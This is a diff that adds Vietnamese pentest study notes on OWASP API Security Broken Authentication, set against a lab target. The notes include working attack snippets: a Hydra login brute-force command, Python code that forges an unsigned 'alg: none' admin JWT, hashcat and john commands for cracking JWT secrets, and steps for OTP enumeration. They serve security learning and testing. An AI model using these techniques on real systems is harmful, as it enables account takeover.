@@ -1,3 +1,21 @@
+# OWASP API Security Top 10 — Notes
+
+## 📚 Mục lục
+
+- [API1:2023 — Broken Object Level Authorization (BOLA)](#api12023--broken-object-level-authorization-bola)
+  - [Khái niệm cốt lõi](#khái-niệm-cốt-lõi)
+  - [Root Cause](#root-cause)
+  - [Các loại Object ID thường gặp](#các-loại-object-id-thường-gặp)
+  - [Các cách khai thác](#các-cách-khai-thác)
+  - [Checklist khi test](#checklist-khi-test)
+- [API2:2023 — Broken Authentication](#api22023--broken-authentication)
+  - [Khái niệm cốt lõi](#khái-niệm-cốt-lõi-1)
+  - [Root Cause](#root-cause-1)
+  - [Các cách khai thác](#các-cách-khai-thác-1)
+  - [Checklist khi test](#checklist-khi-test-1)
+
+---
+
 # API1:2023 — Broken Object Level Authorization (BOLA)
 
 ## Khái niệm cốt lõi
@@ -137,3 +155,147 @@ Dùng `invoice_id` hoặc `user_id` để pivot sang endpoint khác.
 - [ ] Kiểm tra nested resource (`/users/{id}/...`)
 - [ ] Kiểm tra GraphQL introspection + query với ID tùy ý
 - [ ] Decode base64/JWT để tìm hidden ID field
+
+---
+
+# API2:2023 — Broken Authentication
+
+## Khái niệm cốt lõi
+
+Broken Authentication xảy ra khi API **triển khai cơ chế xác thực sai hoặc thiếu**, cho phép attacker chiếm quyền truy cập tài khoản hoặc bypass hoàn toàn bước xác thực.
+
+```
+Attacker  →  POST /api/login (brute force)  →  200 OK + token ← No rate limit!
+Attacker  →  GET /api/admin  (no token)     →  200 OK         ← Missing auth check!
+```
+
+---
+
+## Root Cause
+
+| Nguyên nhân | Mô tả |
+|-------------|-------|
+| Không có rate limiting | Brute force mật khẩu / OTP thoải mái |
+| Token yếu / predictable | JWT `alg: none`, secret yếu, token tuần tự |
+| Thiếu kiểm tra token | Endpoint không verify token hoặc chỉ check format |
+| Credential stuffing | Không chặn login với leaked credential list |
+| Lộ token qua URL | Token nằm trong query string, bị log lại |
+| Không có expiry | Token không hết hạn, revoke không hoạt động |
+
+---
+
+## Các cách khai thác
+
+### 1. Brute Force / Credential Stuffing
+```http
+POST /api/login HTTP/1.1
+{"username": "admin", "password": "password123"}
+```
+Không có rate limit → dùng Burp Intruder / Hydra để brute force.
+
+```bash
+# [ATTACKER]
+hydra -L users.txt -P passwords.txt target.lab http-post-form \
+  "/api/login:username=^USER^&password=^PASS^:Invalid credentials"
+```
+
+---
+
+### 2. JWT Algorithm Confusion — `alg: none`
+```python
+# Tạo JWT không cần signature
+import base64, json
+
+header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=")
+payload = base64.urlsafe_b64encode(json.dumps({"user_id":1,"role":"admin"}).encode()).rstrip(b"=")
+token   = f"{header.decode()}.{payload.decode()}."  # signature rỗng
+```
+
+---
+
+### 3. JWT Weak Secret — Brute Force
+```bash
+# [ATTACKER]
+hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
+# hoặc
+john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt
+```
+Sau khi crack được secret → tự ký token với role tùy ý.
+
+---
+
+### 4. JWT Algorithm Confusion — RS256 → HS256
+Server dùng RS256 (public/private key). Nếu server không validate `alg`:
+```
+1. Lấy public key của server (thường public)
+2. Đổi alg từ RS256 → HS256
+3. Ký token bằng public key như HMAC secret
+→ Server verify bằng public key → pass!
+```
+
+---
+
+### 5. OTP / 2FA Bypass
+```http
+# Brute force 4-6 digit OTP (10000–1000000 khả năng)
+POST /api/verify-otp HTTP/1.1
+{"otp": "0000"}
+{"otp": "0001"}
+...
+```
+Không có rate limit + không có lockout → enumerate hết OTP.
+
+---
+
+### 6. Token Leak qua URL / Logs
+```http
+# Token trong query string → bị lưu vào server log, browser history, Referer header
+GET /api/user/profile?token=eyJhbGc... HTTP/1.1
+```
+
+---
+
+### 7. Missing Authentication trên Sensitive Endpoint
+```http
+# Endpoint không yêu cầu token
+GET /api/admin/users HTTP/1.1
+→ 200 OK (không cần auth)
+
+POST /api/password-reset HTTP/1.1
+{"user_id": 55}
+→ Reset password không cần verify ownership
+```
+
+---
+
+### 8. Password Reset Token Predictable / Reusable
+```http
+# Token reset dạng timestamp hoặc sequential
+GET /api/reset?token=1720000001  ← timestamp
+GET /api/reset?token=1720000002
+# Hoặc token không expire / dùng lại được nhiều lần
+```
+
+---
+
+### 9. OAuth Misconfiguration
+```
+- redirect_uri không được validate → token bị redirect về attacker server
+- state parameter không có → CSRF trên OAuth flow
+- implicit flow leak token trong URL fragment
+```
+
+---
+
+## Checklist khi test
+
+- [ ] Test brute force login — có rate limit / lockout không?
+- [ ] Decode JWT, kiểm tra `alg`, thử đổi sang `none`
+- [ ] Brute force JWT secret bằng hashcat/john
+- [ ] Thử đổi `alg` từ RS256 → HS256 với public key
+- [ ] Brute force OTP — có rate limit không?
+- [ ] Kiểm tra token có nằm trong URL / log không
+- [ ] Gọi sensitive endpoint không kèm token → có trả 401 không?
+- [ ] Kiểm tra token expiry — token cũ còn dùng được không?
+- [ ] Kiểm tra password reset token — có predictable / reusable không?
+- [ ] Kiểm tra OAuth `redirect_uri` validation và `state` parameter
